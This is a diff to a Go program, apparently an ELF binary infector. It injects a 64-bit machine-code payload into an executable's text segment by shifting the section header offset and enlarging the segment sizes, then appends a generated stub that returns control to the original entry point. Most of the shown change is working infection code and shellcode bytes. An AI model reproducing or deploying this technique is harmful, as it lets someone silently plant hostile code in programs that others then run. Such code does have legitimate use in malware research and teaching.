@@ -39,7 +39,7 @@ const (
 /*
 	Calculating the OEP
 	mov rax, rip
-					; rax - bytes-b4-this-statement + size_of_original_text_segment
+; rax - bytes-b4-this-statement + size_of_original_text_segment
 */
 
 var payload64 = []byte{
@@ -75,6 +75,7 @@ var payload64 = []byte{
 	0x5a,                         //pop    %rdx
 	0x5e,                         //pop    %rsi
 	0x5f,                         //pop    %rdi
+	/*
 	0xe8, 0x12, 0x00, 0x00, 0x00, //call   401061 <get_eip>
 	0x48, 0x83, 0xe8, 0x4f, 	//sub    $0x4f,%rax
 	0x48, 0x2d, 0xd1, 0x73, 0x01, 0x00, //sub    $0x173d1,%rax
@@ -84,6 +85,7 @@ var payload64 = []byte{
 	//0000000000401061 <get_eip>:
 	0x48, 0x8b, 0x04, 0x24, //mov    (%rsp),%rax
 	0xc3, //ret
+	*/
 }
 
 var dummypayload = []byte{0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44}
@@ -142,6 +144,7 @@ func main() {
 	var oShoff uint64
 	oEntry = elfHeader.Entry
 	oShoff = elfHeader.Shoff
+
 	//[1] increase the e_shoff by PAGESIZE
 	elfHeader.Shoff += x64_PAGE_SIZE
 
@@ -157,6 +160,7 @@ func main() {
 
 	var textNdx int
 	var textSegEnd uint64
+	var retStub []byte 
 	for i := 0; i < int(elfHeader.Phnum); i++ {
 		if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
 			//fmt.Printf("text segment offset @ 0x%x and is %d/%d", pHeaders[i].Off, i, elfHeader.Phnum)
@@ -169,10 +173,22 @@ func main() {
 			//[5] && [6]
 			textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
 			fmt.Printf("text segment ends @ 0x%x\n", textSegEnd)
+			fmt.Printf("Payload size pre-epilogue 0x%x", len(payload64))
+			retStub = modEpilogue64(int32(len(payload64) + 5), elfHeader.Entry, oEntry)
+			payload64 = append(payload64, retStub...)
+			fmt.Printf("Payload size post-epilogue 0x%x", len(payload64))
+
+			fmt.Print("[")
+			for _, h := range payload64 {
+				fmt.Printf("0x%02x ", h)
+			}
+			fmt.Println("]")
+
 			pHeaders[i].Memsz += uint64(len(payload64))
 			pHeaders[i].Filesz += uint64(len(payload64))
 			if debug {
-				fmt.Printf("[+] Increasing text segment p_filesz and p_memsz by %d (length of payload)\n", len(payload64))
+				fmt.Println("[+] Generated and appended position independent return 2 OEP stub to payload")
+				fmt.Printf("[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n", len(payload64))
 			}
 		}
 	}
